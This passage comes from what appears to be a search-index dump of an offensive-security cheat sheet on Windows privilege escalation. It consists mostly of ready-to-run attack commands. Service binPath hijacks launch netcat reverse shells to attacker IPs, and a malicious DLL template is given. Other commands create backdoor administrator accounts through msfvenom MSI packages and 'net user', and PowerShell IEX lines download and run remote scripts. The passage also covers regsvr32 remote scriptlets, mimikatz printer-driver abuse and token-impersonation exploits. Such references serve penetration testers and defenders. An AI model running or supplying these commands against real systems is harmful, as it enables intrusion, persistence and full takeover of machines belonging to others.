Settings\\%username%\\Start Menu\\Programs\\Startup\"\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-incorrect-permissions-in-services","title":"EoP - Incorrect permissions in services","text":"<p>A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.</p> <p>Often, services are pointing to writeable locations: - Orphaned installs, not installed anymore but still exist in startup - DLL Hijacking     <pre><code># find missing DLL \n- Find-PathDLLHijack PowerUp.ps1\n- Process Monitor : check for \"Name Not Found\"\n# compile a malicious dll\n- For x64 compile with: \"x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll\"\n- For x86 compile with: \"i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll\"\n# content of windows_dll.c\n#include &lt;windows.h&gt;\nBOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {\nif (dwReason == DLL_PROCESS_ATTACH) {\nsystem(\"cmd.exe /k whoami &gt; C:\\\\Windows\\\\Temp\\\\dll.txt\");\nExitProcess(0);\n}\nreturn TRUE;\n}\n</code></pre></p> <ul> <li>PATH directories with weak permissions     <pre><code>$ for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a &gt;&gt; c:\\windows\\temp\\permissions.txt\n$ for /f eol^=^\"^ delims^=^\" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\"\n$ sc query state=all | findstr \"SERVICE_NAME:\" &gt;&gt; Servicenames.txt\nFOR /F %i in (Servicenames.txt) DO echo %i\ntype Servicenames.txt\nFOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt\nFOR /F %i in (services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" &gt;&gt; path.txt\n</code></pre></li> </ul> <p>Alternatively you can use the Metasploit exploit : <code>exploit/windows/local/service_permissions</code></p> <p>Note to check file permissions you can use <code>cacls</code> and <code>icacls</code></p> <p>icacls (Windows Vista +)   cacls (Windows XP)</p> <p>You are looking for <code>BUILTIN\\Users:(F)</code>(Full access), <code>BUILTIN\\Users:(M)</code>(Modify access) or  <code>BUILTIN\\Users:(W)</code>(Write-only access) in the output.</p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#example-with-windows-10-cve-2019-1322-usosvc","title":"Example with Windows 10 - CVE-2019-1322 UsoSvc","text":"<p>Prerequisite: Service account</p> <pre><code>PS C:\\Windows\\system32&gt; sc.exe stop UsoSvc\nPS C:\\Windows\\system32&gt; sc.exe config usosvc binPath=\"C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\nPS C:\\Windows\\system32&gt; sc.exe config UsoSvc binpath= \"C:\\Users\\mssql-svc\\Desktop\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\nPS C:\\Windows\\system32&gt; sc.exe config UsoSvc binpath= \"cmd /C C:\\Users\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\nPS C:\\Windows\\system32&gt; sc.exe qc usosvc\n[SC] QueryServiceConfig SUCCESS\nSERVICE_NAME: usosvc\nTYPE               : 20  WIN32_SHARE_PROCESS \nSTART_TYPE         : 2   AUTO_START  (DELAYED)\nERROR_CONTROL      : 1   NORMAL\nBINARY_PATH_NAME   : C:\\Users\\mssql-svc\\Desktop\\nc.exe 10.10.10.10 4444 -e cmd.exe\nLOAD_ORDER_GROUP   : \nTAG                : 0\nDISPLAY_NAME       : Update Orchestrator Service\nDEPENDENCIES       : rpcss\nSERVICE_START_NAME : LocalSystem\nPS C:\\Windows\\system32&gt; sc.exe start UsoSvc\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#example-with-windows-xp-sp1-upnphost","title":"Example with Windows XP SP1 - upnphost","text":"<pre><code># NOTE: spaces are mandatory for this exploit to work !\nsc config upnphost binpath= \"C:\\Inetpub\\wwwroot\\nc.exe 10.11.0.73 4343 -e C:\\WINDOWS\\System32\\cmd.exe\"\nsc config upnphost obj= \".\\LocalSystem\" password= \"\"\nsc qc upnphost\nsc config upnphost depend= \"\"\nnet start upnphost\n</code></pre> <p>If it fails because of a missing dependency, try the following commands.</p> <pre><code>sc config SSDPSRV start=auto\nnet start SSDPSRV\nnet stop upnphost\nnet start upnphost\nsc config upnphost depend=\"\"\n</code></pre> <p>Using <code>accesschk</code> from Sysinternals or accesschk-XP.exe - github.com/phackt</p> <pre><code>$ accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula\nRW SSDPSRV\nSERVICE_ALL_ACCESS\nRW upnphost\nSERVICE_ALL_ACCESS\n$ accesschk.exe -ucqv upnphost\nupnphost\nRW NT AUTHORITY\\SYSTEM\nSERVICE_ALL_ACCESS\nRW BUILTIN\\Administrators\nSERVICE_ALL_ACCESS\nRW NT AUTHORITY\\Authenticated Users\nSERVICE_ALL_ACCESS\nRW BUILTIN\\Power Users\nSERVICE_ALL_ACCESS\n$ sc config &lt;vuln-service&gt; binpath=\"net user backdoor backdoor123 /add\"\n$ sc config &lt;vuln-service&gt; binpath= \"C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe\"\n$ sc stop &lt;vuln-service&gt;\n$ sc start &lt;vuln-service&gt;\n$ sc config &lt;vuln-service&gt; binpath=\"net localgroup Administrators backdoor /add\"\n$ sc stop &lt;vuln-service&gt;\n$ sc start &lt;vuln-service&gt;\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-windows-subsystem-for-linux-wsl","title":"EoP - Windows Subsystem for Linux (WSL)","text":"<p>Technique borrowed from Warlockobama's tweet</p> <p>With root privileges Windows  Subsystem for Linux (WSL)  allows users to create a bind shell on any port (no elevation needed). Don't know the root password? No problem just set the default user to root W/ .exe --default-user root. Now start your bind shell or reverse. <pre><code>wsl whoami\n./ubuntun1604.exe config --default-user root\nwsl whoami\nwsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'\n</code></pre> <p>Binary <code>bash.exe</code> can also be found in <code>C:\\Windows\\WinSxS\\amd64_microsoft-windows-lxssbash_[...]\\bash.exe</code></p> <p>Alternatively you can explore the <code>WSL</code> filesystem in the folder <code>C:\\Users\\%USERNAME%\\AppData\\Local\\Packages\\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\\LocalState\\rootfs\\</code></p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-unquoted-service-paths","title":"EoP - Unquoted Service Paths","text":"<p>The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.</p> <pre><code>wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\"\nwmic service get name,displayname,startmode,pathname | findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\"\ngwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Auto\" -and $_.PathName -notlike \"C:\\Windows*\" -and $_.PathName -notlike '\"*'} | select PathName,DisplayName,Name\n</code></pre> <ul> <li>Metasploit exploit : <code>exploit/windows/local/trusted_service_path</code></li> <li>PowerUp exploit     <pre><code># find the vulnerable application\nC:\\&gt; powershell.exe -nop -exec bypass \"IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks\"\n...\n[*] Checking for unquoted service paths...\nServiceName   : BBSvc\nPath          : C:\\Program Files\\Microsoft\\Bing Bar\\7.1\\BBSvc.exe\nStartName     : LocalSystem\nAbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path &lt;HijackPath&gt;\n...\n# automatic exploit\nInvoke-ServiceAbuse -Name [SERVICE_NAME] -Command \"..\\..\\Users\\Public\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#example","title":"Example","text":"<p>For <code>C:\\Program Files\\something\\legit.exe</code>, Windows will try the following paths first: - <code>C:\\Program.exe</code> - <code>C:\\Program Files.exe</code></p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-path-interception","title":"EoP - $PATH Interception","text":"<p>Requirements: - PATH contains a writeable folder with low privileges. - The writeable folder is before the folder that contains the legitimate binary.</p> <p>EXAMPLE: <pre><code># List contents of the PATH environment variable\n# EXAMPLE OUTPUT: C:\\Program Files\\nodejs\\;C:\\WINDOWS\\system32\n$env:Path\n# See permissions of the target folder\n# EXAMPLE OUTPUT: BUILTIN\\Users: GR,GW\nicacls.exe \"C:\\Program Files\\nodejs\\\"\n# Place our evil-file in that folder.\ncopy evil-file.exe \"C:\\Program Files\\nodejs\\cmd.exe\"\n</code></pre></p> <p>Because (in this example) \"C:\\Program Files\\nodejs\\\" is before \"C:\\WINDOWS\\system32\\\" on the PATH variable, the next time the user runs \"cmd.exe\", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder. </p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-named-pipes","title":"EoP - Named Pipes","text":"<ol> <li>Find named pipes: <code>[System.IO.Directory]::GetFiles(\"\\\\.\\pipe\\\")</code></li> <li>Check named pipes DACL: <code>pipesec.exe &lt;named_pipe&gt;</code></li> <li>Reverse engineering software</li> <li>Send data throught the named pipe : <code>program.exe &gt;\\\\.\\pipe\\StdOutPipe 2&gt;\\\\.\\pipe\\StdErrPipe</code></li> </ol>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-kernel-exploitation","title":"EoP - Kernel Exploitation","text":"<p>List of exploits kernel : https://github.com/SecWiki/windows-kernel-exploits</p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#security-bulletinkb-descriptionoperating-system","title":"#Security Bulletin\u00a0\u00a0\u00a0#KB \u00a0\u00a0\u00a0\u00a0#Description\u00a0\u00a0\u00a0\u00a0#Operating System","text":"<ul> <li>MS17-017 \u3000[KB4013081]\u3000\u3000[GDI Palette Objects Local Privilege Escalation]\u3000\u3000(windows 7/8)</li> <li>CVE-2017-8464 \u3000[LNK Remote Code Execution Vulnerability]\u3000\u3000(windows 10/8.1/7/2016/2010/2008)</li> <li>CVE-2017-0213 \u3000[Windows COM Elevation of Privilege Vulnerability]\u3000\u3000(windows 10/8.1/7/2016/2010/2008)</li> <li>CVE-2018-0833   [SMBv3 Null Pointer Dereference Denial of Service]    (Windows 8.1/Server 2012 R2)</li> <li>CVE-2018-8120   [Win32k Elevation of Privilege Vulnerability]    (Windows 7 SP1/2008 SP2,2008 R2 SP1)</li> <li>MS17-010 \u3000[KB4013389]\u3000\u3000[Windows Kernel Mode Drivers]\u3000\u3000(windows 7/2008/2003/XP)</li> <li>MS16-135 \u3000[KB3199135]\u3000\u3000[Windows Kernel Mode Drivers]\u3000\u3000(2016)</li> <li>MS16-111 \u3000[KB3186973]\u3000\u3000[kernel api]\u3000\u3000(Windows 10 10586 (32/64)/8.1)</li> <li>MS16-098 \u3000[KB3178466]\u3000\u3000[Kernel Driver]\u3000\u3000(Win 8.1)</li> <li>MS16-075 \u3000[KB3164038]\u3000\u3000[Hot Potato]\u3000\u3000(2003/2008/7/8/2012)</li> <li>MS16-034 \u3000[KB3143145]\u3000\u3000[Kernel Driver]\u3000\u3000(2008/7/8/10/2012)</li> <li>MS16-032 \u3000[KB3143141]\u3000\u3000[Secondary Logon Handle]\u3000\u3000(2008/7/8/10/2012)</li> <li>MS16-016 \u3000[KB3136041]\u3000\u3000[WebDAV]\u3000\u3000(2008/Vista/7)</li> <li>MS16-014 \u3000[K3134228]\u3000\u3000[remote code execution]\u3000\u3000(2008/Vista/7)   ...</li> <li>MS03-026 \u3000[KB823980]\u3000\u3000 [Buffer Overrun In RPC Interface]\u3000\u3000(/NT/2000/XP/2003)  </li> </ul> <p>To cross compile a program from Kali, use the following command.</p> <pre><code>Kali&gt; i586-mingw32msvc-gcc -o adduser.exe useradd.c\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-alwaysinstallelevated","title":"EoP - AlwaysInstallElevated","text":"<p>Check if these registry values are set to \"1\".</p> <pre><code>$ reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n$ reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n$ Get-ItemProperty HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\n$ Get-ItemProperty HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\n</code></pre> <p>Then create an MSI package and install it.</p> <pre><code>$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi\n$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi\n$ msiexec /quiet /qn /i C:\\evil.msi\n</code></pre> <p>Technique also available in : * Metasploit : <code>exploit/windows/local/always_install_elevated</code> * PowerUp.ps1 : <code>Get-RegistryAlwaysInstallElevated</code>, <code>Write-UserAddMSI</code></p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-insecure-gui-apps","title":"EoP - Insecure GUI apps","text":"<p>Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.</p> <p>Example: \"Windows Help and Support\" (Windows + F1), search for \"command prompt\", click on \"Click to open Command Prompt\"</p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-evaluating-vulnerable-drivers","title":"EoP - Evaluating Vulnerable Drivers","text":"<p>Look for vuln drivers loaded, we often don't spend enough time looking at this:</p> <pre><code># Native binary\nPS C:\\Users\\Swissky&gt; driverquery.exe /fo table /si\nModule Name  Display Name           Driver Type   Link Date\n============ ====================== ============= ======================\n1394ohci     1394 OHCI Compliant Ho Kernel        12/10/2006 4:44:38 PM\n3ware        3ware                  Kernel        5/18/2015 6:28:03 PM\nACPI         Microsoft ACPI Driver  Kernel        12/9/1975 6:17:08 AM\nAcpiDev      ACPI Devices driver    Kernel        12/7/1993 6:22:19 AM\nacpiex       Microsoft ACPIEx Drive Kernel        3/1/2087 8:53:50 AM\nacpipagr     ACPI Processor Aggrega Kernel        1/24/2081 8:36:36 AM\nAcpiPmi      ACPI Power Meter Drive Kernel        11/19/2006 9:20:15 PM\nacpitime     ACPI Wake Alarm Driver Kernel        2/9/1974 7:10:30 AM\nADP80XX      ADP80XX                Kernel        4/9/2015 4:49:48 PM\n&lt;SNIP&gt;\n# https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery\nPS C:\\Users\\Swissky&gt; DriverQuery.exe --no-msft\n[+] Enumerating driver services...\n[+] Checking file signatures...\nCitrix USB Filter Driver\nService Name: ctxusbm\nPath: C:\\Windows\\system32\\DRIVERS\\ctxusbm.sys\nVersion: 14.11.0.138\nCreation Time (UTC): 17/05/2018 01:20:50\nCert Issuer: CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=Symantec Corporation, C=US\nSigner: CN=\"Citrix Systems, Inc.\", OU=XenApp(ClientSHA256), O=\"Citrix Systems, Inc.\", L=Fort Lauderdale, S=Florida, C=US\n&lt;SNIP&gt;\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-printers","title":"EoP - Printers","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#universal-printer","title":"Universal Printer","text":"<p>Create a Printer</p> <pre><code>$printerName     = 'Universal Priv Printer'\n$system32        = $env:systemroot + '\\system32'\n$drivers         = $system32 + '\\spool\\drivers'\n$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers\\' + $printerName\nCopy-Item -Force -Path ($system32 + '\\mscms.dll')             -Destination ($system32 + '\\mimispool.dll')\nCopy-Item -Force -Path '.\\mimikatz_trunk\\x64\\mimispool.dll'   -Destination ($drivers  + '\\x64\\3\\mimispool.dll')\nCopy-Item -Force -Path '.\\mimikatz_trunk\\win32\\mimispool.dll' -Destination ($drivers  + '\\W32X86\\3\\mimispool.dll')\nAdd-PrinterDriver -Name       'Generic / Text Only'\nAdd-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared\nNew-Item         -Path ($RegStartPrinter + '\\CopyFiles')        | Out-Null\nNew-Item         -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi')   | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\\3'           | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null\nNew-Item         -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\\3'        | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null\nNew-Item         -Path ($RegStartPrinter + '\\CopyFiles\\Mango')  | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null\n</code></pre> <p>Execute the driver</p> <pre><code>$serverName  = 'dc.purple.lab'\n$printerName = 'Universal Priv Printer'\n$fullprinterName = '\\\\' + $serverName + '\\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})\nRemove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue\nAdd-Printer -ConnectionName $fullprinterName\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#printernightmare","title":"PrinterNightmare","text":"<pre><code>git clone https://github.com/Flangvik/DeployPrinterNightmare\nPS C:\\adversary&gt; FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell\n[&lt;3] @Flangvik - TrustedSec\n[+] Copying C:\\Windows\\system32\\mscms.dll to C:\\Windows\\system32\\6cfbaf26f4c64131896df8a522546e9c.dll\n[+] Copying 64mimispool.dll to C:\\Windows\\system32\\spool\\drivers\\x64\\3\\6cfbaf26f4c64131896df8a522546e9c.dll\n[+] Copying 32mimispool.dll to C:\\Windows\\system32\\spool\\drivers\\W32X86\\3\\6cfbaf26f4c64131896df8a522546e9c.dll\n[+] Adding printer driver =&gt; Generic / Text Only!\n[+] Adding printer =&gt; EasySystemShell!\n[+] Setting 64-bit Registry key\n[+] Setting 32-bit Registry key\n[+] Setting '*' Registry key\n</code></pre> <pre><code>PS C:\\target&gt; $serverName  = 'printer-installed-host'\nPS C:\\target&gt; $printerName = 'EasySystemShell'\nPS C:\\target&gt; $fullprinterName = '\\\\' + $serverName + '\\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})\nPS C:\\target&gt; Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue\nPS C:\\target&gt; Add-Printer -ConnectionName $fullprinterName\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#bring-your-own-vulnerability","title":"Bring Your Own Vulnerability","text":"<p>Concealed Position : https://github.com/jacob-baines/concealed_position</p> <ul> <li>ACIDDAMAGE - CVE-2021-35449 - Lexmark Universal Print Driver LPE</li> <li>RADIANTDAMAGE - CVE-2021-38085 - Canon TR150 Print Driver LPE</li> <li>POISONDAMAGE - CVE-2019-19363 - Ricoh PCL6 Print Driver LPE</li> <li>SLASHINGDAMAGE - CVE-2020-1300 - Windows Print Spooler LPE</li> </ul> <pre><code>cp_server.exe -e ACIDDAMAGE\n# Get-Printer\n# Set the \"Advanced Sharing Settings\" -&gt; \"Turn off password protected sharing\"\ncp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE\ncp_client.exe -l -e ACIDDAMAGE\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-runas","title":"EoP - Runas","text":"<p>Use the <code>cmdkey</code> to list the stored credentials on the machine.</p> <pre><code>cmdkey /list\nCurrently stored credentials:\nTarget: Domain:interactive=WORKGROUP\\Administrator\nType: Domain Password\nUser: WORKGROUP\\Administrator\n</code></pre> <p>Then you can use <code>runas</code> with the <code>/savecred</code> options in order to use the saved credentials.  The following example is calling a remote binary via an SMB share. <pre><code>runas /savecred /user:WORKGROUP\\Administrator \"\\\\10.XXX.XXX.XXX\\SHARE\\evil.exe\"\nrunas /savecred /user:Administrator \"cmd.exe /k whoami\"\n</code></pre></p> <p>Using <code>runas</code> with a provided set of credential.</p> <pre><code>C:\\Windows\\System32\\runas.exe /env /noprofile /user:&lt;username&gt; &lt;password&gt; \"c:\\users\\Public\\nc.exe -nc &lt;attacker-ip&gt; 4444 -e cmd.exe\"\n</code></pre> <pre><code>$secpasswd = ConvertTo-SecureString \"&lt;password&gt;\" -AsPlainText -Force\n$mycreds = New-Object System.Management.Automation.PSCredential (\"&lt;user&gt;\", $secpasswd)\n$computer = \"&lt;hostname&gt;\"\n[System.Diagnostics.Process]::Start(\"C:\\users\\public\\nc.exe\",\"&lt;attacker_ip&gt; 4444 -e cmd.exe\", $mycreds.Username, $mycreds.Password, $computer)\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-abusing-shadow-copies","title":"EoP - Abusing Shadow Copies","text":"<p>If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation.</p> <pre><code># List shadow copies using vssadmin (Needs Admnistrator Access)\nvssadmin list shadows\n# List shadow copies using diskshadow\ndiskshadow list shadows all\n# Make a symlink to the shadow copy and access it\nmklink /d c:\\shadowcopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-from-local-administrator-to-nt-system","title":"EoP - From local administrator to NT SYSTEM","text":"<pre><code>PsExec.exe -i -s cmd.exe\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-living-off-the-land-binaries-and-scripts","title":"EoP - Living Off The Land Binaries and Scripts","text":"<p>Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/</p> <p>The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.</p> <p>A LOLBin/Lib/Script must:</p> <ul> <li>Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft. Have extra \"unexpected\" functionality. It is not interesting to document intended use cases. Exceptions are application whitelisting bypasses</li> <li>Have functionality that would be useful to an APT or red team</li> </ul> <pre><code>wmic.exe process call create calc\nregsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll\nMicrosoft.Workflow.Compiler.exe tests.xml results.xml\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-impersonation-privileges","title":"EoP - Impersonation Privileges","text":"<p>Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.</p> Privilege Impact Tool Execution path Remarks <code>SeAssignPrimaryToken</code> Admin 3rd party tool \"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe\" Thank you Aur\u00e9lien Chalot for the update. I will try to re-phrase it to something more recipe-like soon. <code>SeBackup</code> Threat Built-in commands Read sensitve files with <code>robocopy /b</code> - May be more interesting if you can read %WINDIR%\\MEMORY.DMP - <code>SeBackupPrivilege</code> (and robocopy) is not helpful when it comes to open files. - Robocopy requires both SeBackup and SeRestore to work with /b parameter. <code>SeCreateToken</code> Admin 3rd party tool Create arbitrary token including local admin rights with <code>NtCreateToken</code>. <code>SeDebug</code> Admin PowerShell Duplicate the <code>lsass.exe</code> token. Script to be found at FuzzySecurity <code>SeLoadDriver</code> Admin 3rd party tool 1. Load buggy kernel driver such as <code>szkg64.sys</code> or <code>capcom.sys</code>2. Exploit the driver vulnerability  Alternatively, the privilege may be used to unload security-related drivers with <code>ftlMC</code> builtin command. i.e.: <code>fltMC sysmondrv</code> 1. The <code>szkg64</code> vulnerability is listed as CVE-2018-157322. The <code>szkg64</code> exploit code was created by Parvez Anwar <code>SeRestore</code> Admin PowerShell 1. Launch PowerShell/ISE with the SeRestore privilege present.2. Enable the privilege with Enable-SeRestorePrivilege).3. Rename utilman.exe to utilman.old4. Rename cmd.exe to utilman.exe5. Lock the console and press Win+U Attack may be detected by some AV software. Alternative method relies on replacing service binaries stored in \"Program Files\" using the same privilege. <code>SeTakeOwnership</code> Admin Built-in commands 1. <code>takeown.exe /f \"%windir%\\system32\"</code>2. <code>icalcs.exe \"%windir%\\system32\" /grant \"%username%\":F</code>3. Rename cmd.exe to utilman.exe4. Lock the console and press Win+U Attack may be detected by some AV software. Alternative method relies on replacing service binaries stored in \"Program Files\" using the same privilege. <code>SeTcb</code> Admin 3rd party tool Manipulate tokens to have local admin rights included. May require SeImpersonate. To be verified."},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#restore-a-service-accounts-privileges","title":"Restore A Service Account's Privileges","text":"<p>This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only.</p> <pre><code># https://github.com/itm4n/FullPowers\nc:\\TOOLS&gt;FullPowers\n[+] Started dummy thread with id 9976\n[+] Successfully created scheduled task.\n[+] Got new token! Privilege count: 7\n[+] CreateProcessAsUser() OK\nMicrosoft Windows [Version 10.0.19041.84]\n(c) 2019 Microsoft Corporation. All rights reserved.\nC:\\WINDOWS\\system32&gt;whoami /priv\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                               State\n============================= ========================================= =======\nSeAssignPrimaryTokenPrivilege Replace a process level token             Enabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled\nSeAuditPrivilege              Generate security audits                  Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled\nSeCreateGlobalPrivilege       Create global objects                     Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set            Enabled\nc:\\TOOLS&gt;FullPowers -c \"C:\\TOOLS\\nc64.exe 1.2.3.4 1337 -e cmd\" -z\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#meterpreter-getsystem-and-alternatives","title":"Meterpreter getsystem and alternatives","text":"<pre><code>meterpreter&gt; getsystem \nTokenvator.exe getsystem cmd.exe \nincognito.exe execute -c \"NT AUTHORITY\\SYSTEM\" cmd.exe \npsexec -s -i cmd.exe \npython getsystem.py # from https://github.com/sailay1996/tokenx_privEsc\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#rottenpotato-token-impersonation","title":"RottenPotato (Token Impersonation)","text":"<ul> <li>Binary available at : foxglovesec/RottenPotato and breenmachine/RottenPotatoNG</li> <li>Exploit using Metasploit with <code>incognito mode</code> loaded.     <pre><code>getuid\ngetprivs\nuse incognito\nlist\\_tokens -u\ncd c:\\temp\\\nexecute -Hc -f ./rot.exe\nimpersonate\\_token \"NT AUTHORITY\\SYSTEM\"\n</code></pre></li> </ul> <pre><code>Invoke-TokenManipulation -ImpersonateUser -Username \"lab\\domainadminuser\"\nInvoke-TokenManipulation -ImpersonateUser -Username \"NT AUTHORITY\\SYSTEM\"\nGet-Process wininit | Invoke-TokenManipulation -CreateProcess \"Powershell.exe -nop -exec bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\\\"};\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#juicy-potato-abusing-the-golden-privileges","title":"Juicy Potato (Abusing the golden privileges)","text":"<p>If the machine is &gt;= Windows 10 1809 &amp; Windows Server 2019 - Try Rogue Potato  If the machine is &lt; Windows 10 1809 &lt; Windows Server 2019 - Try Juicy Potato</p> <ul> <li> <p>Binary available at : ohpe/juicy-potato </p> </li> <li> <p>Check the privileges of the service account, you should look for SeImpersonate and/or SeAssignPrimaryToken (Impersonate a client after authentication)</p> <pre><code>whoami /priv\n</code></pre> </li> <li> <p>Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object</p> <ul> <li>Windows 7 Enterprise </li> <li>Windows 8.1 Enterprise</li> <li>Windows 10 Enterprise</li> <li>Windows 10 Professional</li> <li>Windows Server 2008 R2 Enterprise </li> <li>Windows Server 2012 Datacenter</li> <li>Windows Server 2016 Standard </li> 